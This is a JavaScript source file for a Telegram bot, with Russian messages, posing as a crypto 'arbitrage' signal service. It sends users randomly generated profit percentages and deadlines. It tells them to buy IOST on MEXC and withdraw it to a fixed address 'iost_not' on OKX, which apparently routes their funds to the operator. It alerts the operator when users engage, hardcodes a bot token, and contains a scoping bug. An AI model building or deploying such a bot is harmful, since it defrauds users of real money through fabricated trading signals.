
const Telegraf = require('telegraf');
const random = require('random');

const TOKEN = '7204909915:AAGhVDCUz9IVvMIKXheTeMNOGhrbE5SOR8Q';
const my_id = '6484525704';

const bot = new Telegraf(TOKEN);

const tradeUsers = {};

const sendTradeMessage = (chatId, prof1, prof2, time) => {
  bot.telegram.sendMessage(chatId, `
    VALUE : IOST 💶
    BUY - MEXC 💹
    SELL - OKX 🉐
    ADRES: iost_not 📂
    PROFIT ${prof1}% - ${prof2}% 💲
    TIME - ${time} 🕐
    `);
};

bot.start((ctx) => {
  ctx.telegram.sendMessage(my_id, 'Кто-то стартанул)');
  ctx.reply(`Добро пожаловать в Arbitration bot.🤖 
Давай сперва объясню суть, как со мной работать и получать прибыль с сделок
                     
\nПо команде - /trade ты будешь получать текст
следующего содержания:`);
  ctx.reply(`
VALUE : IOST 💶
BUY - MEXC 💹
SELL - OKX 🉐
ADRES: iost_not 📂
PROFIT 2.4%-3.5% 💲
TIME - 40min 🕐`);
  ctx.reply(`
Теперь раскладываем все по полочкам!

Качаем 3 основные биржи - OKX, MEXC, HTX. 
С ними мы будем чаше всего работать. Так же, проходим в них верификацию.

Заходим на биржу в строчке 'BUY', и покупаем валюту со строчки 'VALUE'.
Далее переходим на биржу со строчки 'SELL' нажимаем:
Мой кошелек -> Депозит -> в поиске валюту с 'VALUE'.
Копируем memo с вашего аккаунта. 

Делаем вывод вывод с биржи 'BUY' на биржу 'SELL', и указываем адрес с 'ADRES'.`);
  ctx.reply(`
Все! Далее ожидаем прибыль на аккаунте 'SELL'. Это может занять от 5 до 120 минут, в зависимости нагрузки болкчейна. Главное успеть это сделать в период 'TIME'. Тогда вы получите обещанный профит в размере 'PROFIT'.
`);
  ctx.reply(`
Наша выгода на основе реферальной системе. Мы получаем % с ваших кругов. 
Лично наши рекомендации:
Начни с более маленькой суммой. 5$!
`);
  ctx.reply(`
Желаем удачи в совершении кругов!
Для повторного вызова данного окна - /start
Для согласия на получения связку - /trade
`);
});

bot.command('trade', (ctx) => {
  const chatId = ctx.chat.id;
  if (!tradeUsers[chatId]) {
    tradeUsers[chatId] = Date.now();
    ctx.telegram.sendMessage(my_id, 'Кто-то трейданул)');
    ctx.reply('Ожидайте связку. Как будет открыто окно, мы будем вас оповещать.');
  }
});

const sendTradeNotifications = async () => {
  const prof1 = random.float(1.9, 2.5);
  const prof2 = random.float(3.2, 3.9);
  const timeToWait = random.int(1200, 3000);

  const now = Date.now();
  for (const userId in tradeUsers) {
    if (now - tradeUsers[userId] >= timeToWait) {
      sendTradeMessage(userId, prof1.toFixed(1), prof2.toFixed(1), timeToWait);
    }
  }
};

const updateTradeValues = async () => {
  while (true) {
    await sendTradeNotifications();
    await new Promise(resolve => setTimeout(resolve, timeToWait + timeToWait / 100 * 10));
  }
};

// Запуск функции обновления значений и отправки уведомлений в отдельном потоке
updateTradeValues();

bot.launch();

// Enable graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
